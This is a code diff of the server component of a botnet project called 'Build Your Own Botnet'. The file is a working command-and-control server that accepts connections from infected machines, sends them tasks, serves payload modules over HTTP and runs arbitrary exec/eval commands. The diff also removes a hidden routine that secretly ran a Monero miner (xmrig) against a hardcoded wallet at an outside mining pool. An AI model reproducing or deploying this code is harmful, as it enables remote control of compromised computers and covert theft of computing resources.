@@ -17,6 +17,7 @@ import pprint
 import inspect
 import hashlib
 import argparse
+import requests
 import threading
 import subprocess
 import collections
@@ -28,103 +29,13 @@ if sys.version_info[0] > 2:
     sys.path.append('core')
     sys.path.append('modules')
 
-from buildyourownbotnet import db
-from buildyourownbotnet.core import database, security, util
-from buildyourownbotnet.models import Session, Task
-
-# packages
-try:
-    import cv2
-except ImportError:
-    util.log("Warning: missing package 'cv2' is required for 'webcam' module.")
-
-try:
-    import colorama
-    colorama.init()
-except ImportError:
-    util.log("Warning: missing package 'colorama' is required.")
-
-try:
-    raw_input          # Python 2
-except NameError:
-    raw_input = input  # Python 3
+from .models import db
+from .core import security, util
+from .core.dao import session_dao
 
 # globals
 __threads = {}
 __abort = False
-
-
-# main
-def main():
-
-    parser = argparse.ArgumentParser(
-        prog='server.py',
-        description="Command & Control Server (Build Your Own Botnet)"
-    )
-
-    parser.add_argument(
-        '--host',
-        action='store',
-        type=str,
-        default='0.0.0.0',
-        help='server hostname or IP address')
-
-    parser.add_argument(
-        '--port',
-        action='store',
-        type=int,
-        default=1337,
-        help='server port number')
-
-    parser.add_argument(
-        '--debug',
-        action='store_true',
-        help='Additional logging'
-    )
-
-    parser.add_argument(
-        '-v', '--version',
-        action='version',
-        version='0.5',
-    )
-
-    # directory containing BYOB modules
-    modules = os.path.abspath('buildyourownbotnet/modules')
-
-    # directory containing user intalled Python packages
-    site_packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'mss' in os.listdir(_)]
-
-    if len(site_packages):
-        n = 0
-        globals()['packages'] = site_packages[0]
-        for path in site_packages:
-            if n < len(os.listdir(path)):
-                n = len(os.listdir(path))
-                globals()['packages'] = path
-    else:
-        util.log("unable to locate directory containing user-installed packages")
-        sys.exit(0)
-
-    args = [_ for _ in sys.argv if _.startswith('--')]
-    options = parser.parse_args(args)
-    tmp_file=open(".log","w")
-
-    # don't run multiple instances
-    try:
-        # serve packages
-        globals()['package_handler'] = subprocess.Popen('{0} -m {1} {2}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
-        print("Serving Python packages from {0} on port {1}...".format(globals()['packages'], options.port + 2))
-
-        # serve modules
-        globals()['module_handler'] = subprocess.Popen('{0} -m {1} {2}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
-        print("Serving BYOB modules from {0} on port {1}...".format(modules, options.port + 1))
-
-        # start c2 server
-        globals()['c2'] = C2(host=options.host, port=options.port, debug=options.debug)
-        globals()['c2'].start()
-    except:
-        pass        
-
 
 class C2(threading.Thread):
     """
@@ -148,11 +59,12 @@ class C2(threading.Thread):
 
         """
         super(C2, self).__init__()
+        self.host = host
+        self.port = port
         self.debug = debug
         self.sessions = {}
         self.child_procs = {}
-        self.socket = self._init_socket(port)
-        #self._init_dev_miner()
+        self.socket = self._init_socket(self.port)
         self.commands = {
             'exit' : {
                 'method': self.quit,
@@ -167,6 +79,42 @@ class C2(threading.Thread):
                 'usage': 'exec <code>',
                 'description': 'execute python code in current context with built-in exec() method'}
         }
+        self._setup_server()
+
+    def _setup_server(self):
+        # directory containing BYOB modules
+        modules = os.path.abspath('buildyourownbotnet/modules')
+
+        # directory containing user intalled Python packages
+        site_packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'mss' in os.listdir(_)]
+
+        if len(site_packages):
+            n = 0
+            globals()['packages'] = site_packages[0]
+            for path in site_packages:
+                if n < len(os.listdir(path)):
+                    n = len(os.listdir(path))
+                    globals()['packages'] = path
+        else:
+            print("unable to locate directory containing user-installed packages")
+            sys.exit(0)
+
+        tmp_file=open(".log","w")
+
+        # don't run multiple instances
+        try:
+            # serve packages
+            globals()['package_handler'] = subprocess.Popen('{0} -m {1} {2}'.format(sys.executable, http_serv_mod, self.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
+            util.log("Serving Python packages from {0} on port {1}...".format(globals()['packages'], self.port + 2))
+
+            # serve modules
+            globals()['module_handler'] = subprocess.Popen('{0} -m {1} {2}'.format(sys.executable, http_serv_mod, self.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
+            util.log("Serving BYOB modules from {0} on port {1}...".format(modules, self.port + 1))
+
+            globals()['c2'] = self
+            globals()['c2'].start()
+        except Exception as e:
+            print("server.C2 failed to launch package_handler and module_handler. Exception: " + str(e))
 
     def _init_socket(self, port):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -174,45 +122,6 @@ class C2(threading.Thread):
         s.bind(('0.0.0.0', port))
         s.listen(128)
         return s
-
-
-    def _init_dev_miner(self):
-        url = 'pool.hashvault.pro'
-        host_port = 80
-        user = '46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa'
-
-        # first attempt using built-in python miner
-        try:
-            from buildyourownbotnet.core.miner import Miner
-            self.child_procs['dev_miner_py'] = Miner(url=url, port=host_port, user=user)
-            self.child_procs['dev_miner_py'].start()
-        except Exception as e:
-            print("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
-
-            # if that fails, try downloading and running xmrig
-            try:
-                import multiprocessing
-                threads = multiprocessing.cpu_count()
-
-                # find correct executable for this platform
-                if sys.platform == 'linux':
-                    platform = 'linux2'
-                else:
-                    platform = sys.platform
-
-                xmrig_path = os.path.abspath('buildyourownbotnet/modules/xmrig/xmrig_' + platform)
-
-                if sys.platform == 'win32':
-                    os.rename(xmrig_path, xmrig_path + '.exe')
-
-                os.chmod(xmrig_path, 755)
-
-                # excute xmrig in hidden process
-                params = xmrig_path + " --url={url}:{host_port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, host_port=host_port, user=user, threads=threads)
-                result = self._execute(params)
-            except Exception as e:
-                print("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
-
 
     def _execute(self, args):
         # ugly method that should be refactored at some point
@@ -235,7 +144,6 @@ class C2(threading.Thread):
         else:
             return "File '{}' not found".format(str(path))
 
-
     def py_exec(self, code):
         """
         Execute code directly in the context of the currently running process
@@ -254,7 +162,6 @@ class C2(threading.Thread):
             exec(code)
         except Exception as e:
             print(e)
-
 
     def py_eval(self, code):
         """
@@ -275,7 +182,6 @@ class C2(threading.Thread):
         except Exception as e:
             print(e)
 
-
     def quit(self):
         """
         Quit server and optionally keep clients alive
@@ -288,7 +194,7 @@ class C2(threading.Thread):
         # put sessions in passive mode
         for owner, sessions in self.sessions.items():
             for session_id, session in sessions.items():
-                if isinstance(session, Session):
+                if isinstance(session, SessionThread):
                     try:
                         session.send_task({"task": "passive"})
                     except: pass
@@ -302,13 +208,11 @@ class C2(threading.Thread):
                 proc.terminate()
             except: pass
 
-
         # forcibly end process
         globals()['__abort'] = True
         _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill {}".format(os.getpid())).read()
-        util.display('Exiting...')
+        util.log('Exiting...')
         sys.exit(0)
-
 
     @util.threaded
     def serve_until_stopped(self):
@@ -316,36 +220,35 @@ class C2(threading.Thread):
             
             connection, address = self.socket.accept()
 
-            session = SessionThread(connection=connection)
-
+            session = SessionThread(connection=connection, c2=self)
             if session.info != None:
 
                 # database stores identifying information about session
-                session_dict = database.handle_session(session.info)
-                session.id = session_dict['id']
+                response = requests.post('http://0.0.0.0:5000/api/session/new', json=dict(session.info))
+                if response.ok:
+                    
+                    session_metadata = response.json()
+                    session_uid = session_metadata.get('uid')
 
-                # display session information in terminal
-                session_dict.pop('new', None)
-                session.info = session_dict
+                    # display session information in terminal
+                    session_metadata.pop('new', None)
+                    session.info = session_metadata
 
-                # add session to user sessions dictionary
-                owner = session.info.get('owner')
-                if owner not in self.sessions:
-                    self.sessions[owner] = {}
+                    # add session to user sessions dictionary
+                    owner = session.info.get('owner')
+                    if owner not in self.sessions:
+                        self.sessions[owner] = {}
 
-                self.sessions[owner][session.info.get('uid')] = session
+                    self.sessions[owner][session_uid] = session
 
-                util.display('New session {}:{} connected'.format(owner, session.info.get('uid')))
+                    util.log('New session {}:{} connected'.format(owner, session_uid))
 
             else:
-                # util.display("\n\n[-]", color='red', style='bright', end=' ')
-                util.display("Failed Connection:", color='white', style='bright', end=' ')
-                util.display(address[0], color='white', style='normal')
+                util.log("Failed Connection: {}".format(address[0]))
 
             abort = globals()['__abort']
             if abort:
                 break
-
 
     @util.threaded
     def serve_resources(self):
@@ -359,7 +262,6 @@ class C2(threading.Thread):
             globals()['package_handler'].terminate()
             globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
 
-
     def run(self):
         """
         Run C2 server administration terminal
@@ -370,11 +272,11 @@ class C2(threading.Thread):
         if 'c2' not in globals()['__threads']:
             globals()['__threads']['c2'] = self.serve_until_stopped()
 
-        # admin shell
+        # admin shell for debugging
         if self.debug:
             while True:
                 try:
-                    raw = raw_input('byob-admin> ')
+                    raw = input('byob-admin> ')
 
                     # handle new line
                     if raw in ['\n']:
@@ -404,7 +306,7 @@ class SessionThread(threading.Thread):
 
     """
 
-    def __init__(self, connection=None, id=0):
+    def __init__(self, connection=None, id=0, c2=None):
         """
         Create a new Session
 
@@ -418,15 +320,15 @@ class SessionThread(threading.Thread):
         super(SessionThread , self).__init__()
         self.created = datetime.utcnow()
         self.id = id
+        self.c2 = c2
         self.connection = connection
-        self.key = security.diffiehellman(self.connection)
         try:
+            self.key = security.diffiehellman(self.connection)
             self.info = self.client_info()
             self.info['id'] = self.id
         except Exception as e:
             util.log("Error creating session: {}".format(str(e)))
             self.info = None
-
 
     def kill(self):
         """
@@ -439,14 +341,14 @@ class SessionThread(threading.Thread):
         session_uid = self.info['uid']
 
         # get owner sessions
-        owner_sessions = globals()['c2'].sessions.get(owner)
+        owner_sessions = self.c2.sessions.get(owner)
 
         # find this session in owner sessions
         if session_uid in owner_sessions:
             session = owner_sessions[session_uid]
 
             # set session status as offline in database
-            database.update_session_status(session_uid, 0)
+            session_dao.update_session_status(session_uid, 0)
 
             # send kill command to client and shutdown the connection
             try:
@@ -457,9 +359,9 @@ class SessionThread(threading.Thread):
 
             _ = owner_sessions.pop(session_uid, None)
 
-            util.display('Session {}:{} disconnected'.format(owner, session_uid))
+            util.log('Session {}:{} disconnected'.format(owner, session_uid))
         else:
-            util.display('Session {}:{} is already offline.'.format(owner, session_uid))
+            util.log('Session {}:{} is already offline.'.format(owner, session_uid))
 
 
     def client_info(self):
@@ -478,7 +380,6 @@ class SessionThread(threading.Thread):
             if str(val).startswith("_b64"):
                 info[key] = base64.b64decode(val[6:]).decode('ascii')
         return info
-
 
     def send_task(self, task):
         """
@@ -504,7 +405,6 @@ class SessionThread(threading.Thread):
         msg  = struct.pack('!L', len(data)) + data
         self.connection.sendall(msg)
         return True
-
 
     def recv_task(self):
         """
@@ -541,6 +441,3 @@ class SessionThread(threading.Thread):
         else:
             # empty header; peer down, scan or recon. Drop.
             return 0
-
-if __name__ == '__main__':
-    main()
